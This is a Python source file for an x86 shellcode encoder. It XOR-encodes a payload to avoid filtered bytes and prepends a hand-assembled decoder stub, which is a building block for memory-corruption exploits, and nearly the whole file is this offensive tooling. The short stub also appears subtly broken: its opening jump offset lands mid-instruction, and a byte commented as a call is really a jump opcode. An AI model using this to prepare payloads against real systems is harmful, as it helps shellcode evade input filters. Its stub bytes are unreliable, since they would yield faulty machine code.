# stub.py
# author: iss4cf0ng/ISSAC

class StubBuilder:
    def __init__(self, shellcode: bytes, badchars: bytes):
        self.shellcode = shellcode
        self.badchars = badchars
        self.key = None
        self.encoded_shellcode = None

    def find_valid_key(self):
        for key in range(1, 256):
            if key in self.badchars:
                continue

            encoded = bytearray()
            has_badchar = False

            for b in self.shellcode:
                eb = b ^ key
                if eb in self.badchars:
                    has_badchar = True
                    break
                
                encoded.append(eb)

            if not has_badchar:
                self.key = key
                self.encoded_shellcode = bytes(encoded)
                
                return True

        return False

    def generate_x86_stub(self) -> bytes:
        length = len(self.encoded_shellcode)
        if length > 255:
            raise ValueError("Shellcode size is larger than 255 bytes")

        stub = bytearray([
            0xEB, 0X0C,                     # jmp short stub_body
            # you can put a custom header
            0x5E,                           # pop esi (get shellcode init address)
            0x31, 0xC9,                     # xor ecx, ecx
            0xB1, length & 0xFF,            # mov cl, length (loop count)
            # decode_loop:
            0x80, 0x36, self.key,           # xor byte [esi], key (decryption)
            0x46,                           # inc esi
            0xE2, 0xFA,                     # loop decode_loop (loop -6)
            0xEB, 0x05,                     # jmp short run_shellcode
            # stub body:
            0xEB, 0xEF, 0xFF, 0xFF, 0xFF    # call -17 (go to pop esi)
        ])

        return bytes(stub)

    def generate_x86_stub_large(self) -> bytes:
        length = len(self.encoded_shellcode)
        length_bytes = length.to_bytes(4, byteorder='little')
        
        for b in length_bytes:
            if b in self.badchars:
                raise ValueError(f"Shellcode size 0x{length:08x}, including badchar")

        stub = bytearray([
            0xEB, 0x13,
            0x5E,
            0x31, 0xC9,
            0xB9
        ])
        
        stub.extend(length_bytes)
        
        stub.extend([
            0x80, 0x36, self.key,
            0x46,
            0x49,
            0x75, 0xF9,
            0xEB, 0x05,
            0xE8, 0xE8, 0xFF, 0xFF, 0xFF
        ])

        return bytes(stub)

    def build(self):
        if not self.find_valid_key():
            raise RuntimeError("Cannot find an XOR key")

        stub = self.generate_x86_stub()
        final_payload = stub + self.encoded_shellcode

        return {
            "key": f"0x{self.key:02x}",
            "stub_size": len(stub),
            "payload_size": len(self.encoded_shellcode),
            "total_size": len(final_payload),
            "final_payload": final_payload
        }

def main():
    shellcode = b"\x90\x90\x90\x00\xcc"
    badchars = b"\x00\x0a"

    try:
        tool = StubBuilder(shellcode, badchars)
        result = tool.build()
        
        print(result)
    except Exception as ex:
        print(ex)

if __name__ == "__main__":
    main()